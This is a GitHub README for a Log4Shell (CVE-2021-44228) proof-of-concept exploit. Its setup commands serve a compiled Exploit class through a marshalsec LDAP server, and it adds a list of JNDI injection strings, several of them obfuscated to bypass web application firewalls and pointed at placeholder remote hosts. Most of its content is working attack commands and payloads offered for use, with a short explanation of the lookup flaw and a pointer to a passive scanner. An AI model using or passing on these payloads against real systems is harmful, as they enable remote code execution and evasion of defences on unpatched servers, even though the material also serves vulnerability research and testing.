# CVE-2021-44228(Apache Log4j Remote Code Execution）

> [Affected versions < 2.15.0](https://logging.apache.org/log4j/2.x/security.html)

### Usage:
```
git clone https://github.com/tangxiaofeng7/apache-log4j-poc.git
cd apache-log4j-poc/src/main/java
javac Exploit.java 
python -m SimpleHTTPServer 8888 
```

```
cd tools
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

Run the project finally,you will see your calculator from local.

Tips: 
> you can use [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit) to Exploit.

### Bypass rc1
For example:
```
${jndi:ldap://127.0.0.1:1389/ badClassName}
```

### Bypass WAF
```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```

### Details Of Vuln
Lookups provide a way to add values to the Log4j configuration at arbitrary places.

[Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)

> The methods to cause leak in finally

```
LogManager.getLogger().error()
LogManager.getLogger().fatal()
```

### Simple Check Method
If you want to do black-box testing， I suggest you do passive scanning.

[BurpLog4jScan](https://github.com/tangxiaofeng7/BurpLog4j2Scan)

Have Fun!!!
![BurpLog4jScan.png](https://github.com/tangxiaofeng7/BurpLog4j2Scan/blob/master/img/result.png)

### Stargazers over time
[![Stargazers over time](https://starchart.cc/tangxiaofeng7/apache-log4j-poc.svg)](https://starchart.cc/tangxiaofeng7/apache-log4j-poc)
